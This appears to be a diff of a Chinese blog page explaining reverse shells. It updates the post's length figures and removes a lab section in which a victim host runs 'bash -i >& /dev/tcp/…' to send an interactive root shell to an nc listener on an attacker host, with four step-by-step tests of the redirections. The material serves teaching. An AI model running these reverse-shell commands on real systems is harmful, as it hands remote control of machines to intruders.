@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.9k字</span>
+            <span class="post-count">902字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">8分钟</span>
+            <span class="post-count">3分钟</span>
         </span>
     </span>
 </div>
@@ -120,63 +120,6 @@
 <p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
 <p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
 <p>==============================================================</p>
-<p><strong>反弹shell实验</strong></p>
-<p>环境：两台CentOS7.6服务器</p>
-<ul>
-<li>攻击端 hacker：10.201.61.194 </li>
-<li>受害端 victim：10.201.61.195 </li>
-</ul>
-<p>\1. 攻击端监听一个端口：</p>
-<p>[root@hacker ~]# <strong>nc -lvp 6767</strong></p>
-<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
-<p><em>Ncat: Listening on :::6767</em></p>
-<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
-<p>2.受害端生成一个反弹shell：</p>
-<p>[root@victim ~]# <strong>bash -i &gt;&amp; /dev/tcp/10.201.61.194/6767 0&gt;&amp;1</strong></p>
-<p>3.攻击端已获取到受害端的bash：</p>
-<p>[root@hacker ~]# nc -lvp 6767</p>
-<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
-<p><em>Ncat: Listening on :::6767</em></p>
-<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
-<p><em>Ncat: Connection from 10.201.61.195.</em></p>
-<p><em>Ncat: Connection from 10.201.61.195:46836.</em></p>
-<p>[root@victim ~]#     //攻击端已获得受害端的远程交互式shell</p>
-<p>[root@victim ~]# hostname</p>
-<p>hostname</p>
-<p>victim</p>
-<p><strong>解释：</strong></p>
-<p>\1. nc -lvp 6767</p>
-<p> -l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
-<p>\2. bash -i</p>
-<p>-i interactive。即产生一个交互式的shell（bash）。</p>
-<p>\3. /dev/tcp/IP/PORT </p>
-<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 <code>bash</code> 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
-<p><strong>通过以下4个小测试来分析反弹shell实现过程：</strong></p>
-<p>（PS: 注意执行步骤顺序）</p>
-<p><strong>测试1：</strong></p>
-<p>受害端：</p>
-<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //第三步<br>[root@victim ~]# </p>
-<p>攻击端：</p>
-<p>[root@hacker ~]# nc -lvp 5566   //第一步</p>
-<p>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:49018.</p>
-<p>victim   //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</p>
-<p><strong>测试2：</strong></p>
-<p>受害端：</p>
-<p>[root@victim ~]# bash -i &lt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。<br>victim</p>
-<p> 攻击端：</p>
-<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:50412.<br>hostname    //第三步（攻击端执行命令）</p>
-<p><strong>测试3</strong>：</p>
-<p>受害端：</p>
-<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1    //第二步<br>[root@victim ~]# hostname    //受害端回显命令<br>[root@victim ~]# id    //受害端回显命令<br>[root@victim ~]# hahaha    //受害端回显命令<br>bash: hahaha: command not found    //受害端回显命令。显示错误命令的输出。<br>[root@victim ~]# </p>
-<p> 攻击端：</p>
-<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:36792.<br>hostname    //第三步（攻击端执行命令）<br>victim<br>id    //第四步（攻击端执行命令）<br>uid=0(root) gid=0(root) groups=0(root)<br>hahaha    //第五步（执行一个错误的命令）</p>
-<p>//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。</p>
-<p> <strong>测试4</strong>（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）： </p>
-<p>受害端：</p>
-<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 2&gt;&amp;1    //第二步。或 # bash -i &amp;&gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 （注：&amp;&gt;或&gt;&amp; 表示混合输出，即标准输出1 + 错误输出2）</p>
-<p>攻击端：</p>
-<p>[root@hacker <del>]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:51182.<br>[root@victim ~]# hostname    //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令</del><br>hostname<br>victim</p>
-<p>//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用<del>~</del></p>
 <h2 id="排查本机网络问题："><a href="#排查本机网络问题：" class="headerlink" title="排查本机网络问题："></a><strong>排查本机网络问题：</strong></h2><table>
 <thead>
 <tr>
